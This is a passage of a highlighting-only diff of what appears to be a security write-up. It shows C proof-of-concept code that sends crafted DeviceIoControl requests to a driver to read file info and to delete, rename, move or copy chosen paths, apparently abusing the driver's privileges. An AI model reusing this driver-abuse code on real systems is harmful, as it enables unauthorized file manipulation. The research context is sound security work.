-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">1</span><span style="color:#555">:</span>
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_info, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[i] File info: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)output_buffer);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_info, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">wprintf</span>(<span style="color:#c30">L</span><span style="color:#c30">&#34;[i] File info: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, (<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)output_buffer);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">2</span><span style="color:#555">:</span>
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">3</span><span style="color:#555">:</span>
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x1</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#75715e">//this is not working id the user doesn&#39;t have rights to access the file
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter new filename:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)((SIZE_T)input_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">4</span><span style="color:#555">:</span> <span style="color:#09f;font-style:italic">//this is not working id the user doesn&#39;t have rights to access the file
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		{
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x2</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter new filename:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)((SIZE_T)input_buffer <span style="color:#555">+</span> <span style="color:#f60">0x210</span>));
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">5</span><span style="color:#555">:</span>
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter new path (move operation):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)((SIZE_T)input_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter new path (move operation):</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)((SIZE_T)input_buffer <span style="color:#555">+</span> <span style="color:#f60">0x210</span>));
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">6</span><span style="color:#555">:</span>
 </span></span><span style="display:flex;"><span>		{
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>;
-</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter new path (copy operation):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)((SIZE_T)input_buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
-</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x420</span>] <span style="color:#555">=</span> <span style="color:#f60">0x4</span>;
+</span></span><span style="display:flex;"><span>			((byte<span style="color:#555">*</span>)input_buffer)[<span style="color:#f60">0x424</span>] <span style="color:#555">=</span> <span style="color:#f60">0x3</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[i] Enter new path (copy operation):</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">ReadStringFromSTDIN</span>((<span style="color:#078;font-weight:bold">wchar_t</span><span style="color:#555">*</span>)((SIZE_T)input_buffer <span style="color:#555">+</span> <span style="color:#f60">0x210</span>));
+</span></span><span style="display:flex;"><span>			<span style="color:#c0f">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#555">&amp;</span>dwBytesOut, <span style="color:#366">NULL</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Couldn&#39;t open the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;[-] Couldn&#39;t open the driver</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#c0f">ExitProcess</span>(<span style="color:#555">-</span><span style="color:#f60">1</span>);
 </span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hDriver);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">CloseHandle</span>(hDriver);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">ExitProcess</span>(<span style="color:#f60">0</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Testing:</p>
 <p>The driver is normally started only if we start the main application, and once we exit it will be terminated and disabled. If we want to start it manually for the testing, we need to start it by our own:</p>
